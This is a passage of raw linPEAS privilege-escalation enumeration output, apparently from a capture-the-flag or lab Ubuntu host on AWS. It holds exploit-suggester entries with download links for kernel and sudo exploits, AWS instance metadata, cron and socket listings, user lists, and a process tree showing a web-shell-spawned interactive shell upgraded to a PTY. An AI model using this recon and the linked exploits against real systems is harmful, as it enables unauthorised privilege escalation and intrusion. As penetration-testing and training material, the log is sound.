   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     
  [1] af_packet                                                                                                                                                                                                                             
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                                                                                                               

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present
/usr/bin/lxc                                                                                                                                                                                                                                
╔══════════╣ Am I Containered?
╔══════════╣ Container details                                                                                                                                                                                                              
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-07bb46d5484ed5af2                                                                                                                                                                                                               
instance-action: none
instance-id: i-067c0d6e8a93b95e8
instance-life-cycle: on-demand
instance-type: t2.nano
region: eu-west-1

══╣ Account Info
{                                                                                                                                                                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2022-11-01T03:34:25Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:84:d7:26:2b:c5/                                                                                                                                                                                                                     
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                                                                                                                                            

══╣ User Data
                                                                                                                                                                                                                                            

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                 
root         1  0.2  1.1  37840  5792 ?        Ss   02:54   0:08 /sbin/init                                                                                                                                                                 
root       377  0.0  0.6  27700  3016 ?        Ss   02:55   0:01 /lib/systemd/systemd-journald
root       406  0.0  0.2  94768  1480 ?        Ss   02:55   0:00 /sbin/lvmetad -f
root       446  0.0  0.8  42872  3988 ?        Ss   02:55   0:00 /lib/systemd/systemd-udevd
root       819  0.0  0.5  16120  2880 ?        Ss   02:55   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       954  0.0  0.0   5216   148 ?        Ss   02:55   0:00 /sbin/iscsid
root       955  0.0  0.7   5716  3508 ?        S<Ls 02:55   0:00 /sbin/iscsid
root       963  0.0  0.6  28544  3080 ?        Ss   02:55   0:00 /lib/systemd/systemd-logind
root       983  0.0  0.2   4392  1268 ?        Ss   02:55   0:00 /usr/sbin/acpid
root       986  0.0  0.5  27724  2748 ?        Ss   02:55   0:00 /usr/sbin/cron -f
syslog    1002  0.0  0.6 260624  3328 ?        Ssl  02:55   0:00 /usr/sbin/rsyslogd -n
message+  1003  0.0  0.7  42884  3692 ?        Ss   02:55   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root      1018  0.0  0.3 621736  1844 ?        Ssl  02:55   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root      1021  0.0  1.1 274484  5940 ?        Ssl  02:55   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root      1024  0.0  5.2 326712 26124 ?        Ssl  02:55   0:00 /usr/bin/amazon-ssm-agent
daemon[0m    1030  0.0  0.4  26040  2004 ?        Ss   02:55   0:00 /usr/sbin/atd -f
root      1034  0.0  0.8  65508  4348 ?        Ss   02:55   0:00 /usr/sbin/sshd -D
root      1038  0.0  0.3  24040  1932 ?        Ss   02:55   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root      1062  0.0  3.2 173336 16144 ?        Ssl  02:55   0:02 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1064  0.0  0.0  13368   156 ?        Ss   02:55   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root      1107  0.0  1.1 277176  5576 ?        Ssl  02:55   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1125  0.0  0.3  14468  1896 ttyS0    Ss+  02:55   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1128  0.0  0.3  14652  1584 tty1     Ss+  02:55   0:00 /sbin/agetty --noclear tty1 linux
root      1206  0.0  4.2 257068 21396 ?        Ss   02:55   0:00 /usr/sbin/apache2 -k start
www-data  1218  0.0  1.4 257320  7012 ?        S    02:55   0:01  _ /usr/sbin/apache2 -k start
www-data  1340  0.0  1.4 257320  7012 ?        S    02:57   0:01  _ /usr/sbin/apache2 -k start
www-data  1345  0.0  2.1 257384 10724 ?        S    02:57   0:01  _ /usr/sbin/apache2 -k start
www-data  1624  0.0  0.1   4500   780 ?        S    03:27   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i
www-data  1628  0.0  0.5  18028  2844 ?        S    03:27   0:00  |       _ /bin/bash
www-data  1648  0.0  0.4  19124  2080 ?        S    03:27   0:00  |           _ /usr/bin/script -qc /bin/bash /dev/null
www-data  1649  0.0  0.1   4500   852 pts/0    Ss   03:27   0:00  |               _ sh -c /bin/bash
www-data  1650  0.0  0.6  18232  3296 pts/0    S    03:27   0:00  |                   _ /bin/bash
root      1906  0.0  0.6  49340  3060 pts/0    S    03:43   0:00  |                       _ su lennie
lennie    1915  0.0  0.7  19920  3696 pts/0    S    03:43   0:00  |                           _ bash
lennie    2052  0.1  0.4   5256  2464 pts/0    S+   03:53   0:00  |                               _ /bin/sh ./linpeas.sh
lennie    6503  0.0  0.1   5256   848 pts/0    S+   03:53   0:00  |                                   _ /bin/sh ./linpeas.sh
lennie    6507  0.0  0.6  36224  3484 pts/0    R+   03:53   0:00  |                                   |   _ ps fauxwww
lennie    6506  0.0  0.1   5256   848 pts/0    S+   03:53   0:00  |                                   _ /bin/sh ./linpeas.sh
www-data  1346  0.0  1.3 257156  6940 ?        S    02:57   0:01  _ /usr/sbin/apache2 -k start
www-data  1347  0.0  1.3 257156  6940 ?        S    02:57   0:01  _ /usr/sbin/apache2 -k start
www-data  1348  0.0  1.3 257164  6940 ?        S    02:57   0:01  _ /usr/sbin/apache2 -k start
www-data  1349  0.0  1.3 257148  6928 ?        S    02:57   0:01  _ /usr/sbin/apache2 -k start
www-data  1350  0.0  1.3 257148  6928 ?        S    02:57   0:01  _ /usr/sbin/apache2 -k start
www-data  1379  0.0  1.3 257164  6928 ?        S    03:02   0:01  _ /usr/sbin/apache2 -k start
www-data  1381  0.0  1.3 257164  6936 ?        S    03:02   0:01  _ /usr/sbin/apache2 -k start
www-data  1382  0.0  1.3 257248  6932 ?        S    03:02   0:01  _ /usr/sbin/apache2 -k start
lennie    1907  0.0  0.9  45316  4612 ?        Ss   03:43   0:00 /lib/systemd/systemd --user
lennie    1910  0.0  0.3  61292  1968 ?        S    03:43   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                          
COMMAND    PID  TID       USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                                                                                                                                                   

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                                          
gdm-password Not Found                                                                                                                                                                                                                      
gnome-keyring-daemon Not Found                                                                                                                                                                                                              
lightdm Not Found                                                                                                                                                                                                                           
vsftpd process found (dump creds from memory as root)                                                                                                                                                                                       
apache2 process found (dump creds from memory as root)
sshd Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      
/usr/bin/crontab                                                                                                                                                                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                                                                                                                                                                    

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Nov 12  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  670 Jun 22  2017 php
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  190 Sep 25  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Nov 12  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rwxr-xr-x  1 root root  539 Jul 15  2020 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 May  7  2019 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 Dec  7  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep 25  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep 25  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Sep 25  2020 .
drwxr-xr-x 96 root root 4096 Nov 12  2020 ..
-rwxr-xr-x  1 root root  210 Jan 27  2020 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  211 Dec  7  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                                                                              
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                                                                 

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path                                                                                                                                              
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES                                                                                                                    
Tue 2022-11-01 06:08:00 UTC  2h 14min left Tue 2022-11-01 02:55:38 UTC  58min ago motd-news.timer              motd-news.service
Tue 2022-11-01 06:55:24 UTC  3h 1min left  Tue 2022-11-01 02:55:38 UTC  58min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue 2022-11-01 16:25:03 UTC  12h left      Tue 2022-11-01 02:55:38 UTC  58min ago apt-daily.timer              apt-daily.service
Wed 2022-11-02 03:09:58 UTC  23h left      Tue 2022-11-01 03:09:58 UTC  43min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a           n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                                                                                   
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/run/acpid.socket                                                                                                                                                                                                                           
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/cgroups-agent
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1002/snapd-session-agent.socket
  └─(Read Write)
/run/user/1002/systemd/notify
  └─(Read Write)
/run/user/1002/systemd/private
  └─(Read Write)
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                                    
:1.0                                 963 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
:1.1                                   1 systemd         root             :1.1          init.scope                -          -                  
:1.15                               9283 busctl          lennie           :1.15         session-c1.scope          c1         -                  
:1.2                                1021 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
:1.3                                1107 polkitd         root             :1.3          polkitd.service           -          -                  
:1.4                                1062 unattended-upgr root             :1.4          unattended-upgrades.se... -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
org.freedesktop.Accounts            1021 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
org.freedesktop.DBus                1003 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.PolicyKit1          1107 polkitd         root             :1.3          polkitd.service           -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               963 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
org.freedesktop.network1               - -               -                (activatable) -                         -         
org.freedesktop.resolve1               - -               -                (activatable) -                         -         
org.freedesktop.systemd1               1 systemd         root             :1.1          init.scope                -          -                  
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Hostname, hosts and DNS
startup                                                                                                                                                                                                                                     
127.0.0.1       localhost

::1     ip6-localhost   ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
127.0.1.1       ubuntu-xenial   ubuntu-xenial

nameserver 10.0.0.2
search eu-west-1.compute.internal
dnsdomainname Not Found
                                                                                                                                                                                                                                            
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:84:d7:26:2b:c5  
          inet addr:10.10.70.66  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::84:d7ff:fe26:2bc5/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:248311 errors:0 dropped:0 overruns:0 frame:0
          TX packets:242903 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:38157599 (38.1 MB)  TX bytes:116557729 (116.5 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:120 errors:0 dropped:0 overruns:0 frame:0
          TX packets:120 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:11880 (11.8 KB)  TX bytes:11880 (11.8 KB)


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                                                                    
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)                                                                                                                                                                                       

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                                                                      
ptrace protection is enabled (1)                                                                                                                                                                                                            
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                  
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
uid=1003(ftpsecure) gid=1003(ftpsecure) groups=1003(ftpsecure)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=112(ftp) gid=118(ftp) groups=118(ftp),33(www-data)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 03:53:46 up 58 min,  0 users,  load average: 0.24, 0.06, 0.02                                                                                                                                                                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
